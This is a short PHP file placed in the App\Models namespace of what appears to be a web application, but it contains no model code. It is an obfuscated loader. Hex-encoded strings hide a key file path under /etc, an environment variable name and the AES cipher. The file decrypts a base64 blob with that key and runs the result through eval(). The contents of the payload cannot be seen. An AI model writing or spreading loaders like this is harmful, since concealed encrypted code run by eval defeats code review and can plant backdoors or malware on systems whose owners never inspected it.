<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('jMe7byQEtbF3qnF/0ZLnxw==');
$c=base64_decode(
'qHke6XX4lgmeufevUwv6NwVnyTdwBrrKY36p3ovYOF7BNCKy2bl8SAG9k9+sJyTY6dY8MazLqlf0' .
'A1BCd37uP4uagC8IFY+D3Dq2Nqg0c8XHyugKZt1kWw1Fq+Hn5VZxHXj103fzvcFqMKNTYmDmrmIv' .
'mpIdI3DOa2cL+xuXp7tbafl/yeKim3Gokk8WdYvmKqe/GjW4VHSSx81VvqoskMgaK9ntGxMZr+Yt' .
'wpNaX9cbZCqMQfNWFmpV8y7PIgygZ3tOmCykikW+b16MY5DENnLQi8uGTlUbqkF8h/IN8LEhltZ2' .
'RaHCDMJuldJ8KVKJ1ns8hqt7neqbQUxCsn99Pmc9bKcd6PgXGS1jZdsPr0WmssRFyeMYnOEJEDvn' .
'n3Tb1OCEzxbyboLBtn5CJd+qzoUG5LsTiLAtm5QxbhfFWn+jcTcKRuCPysUVl8XI5Nsuxk6knNLS' .
'sYnjtEClQ3PoDlxxqBb0eGNxy1rcjjzUL8N0v+O+egSyqLHR6rfNCZQHnN2eRfrR6JJSY67slxTg' .
'mrtLE4Xyu90jB2Zz/jdK+D5wjkAX7zAUOkb3aPv54cs2BAW2Rl8YraYRAhhImsf2jxGBXYeXogDn' .
'TgDutVYQVIQsTTDjZ7Pt3rNqPVzVK1TzRMXQOCG5cGZKhY9C+yZHOnSy8EcNtO+/aVGtAY2n4ABJ' .
'AbprGh1S9t94YnhzXOXp7Iq6eWYs0Q7pUlF0otv9v+BdpMUYLJLu4h0WHKLXmLaaZTkG3doEbv7l' .
'jHMLcvkLlcJg7PJD3HAs52bINqzJCfS5st0MHF8SUVdG57aO2RvaGcLpgKP+xD6imD5TKGaOL6TH' .
't+EvCDh5KTvF3VdSDRIwARdleFrtDP/tqrPa4zcIfGenf3FVOnUSODeG1TzV'
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
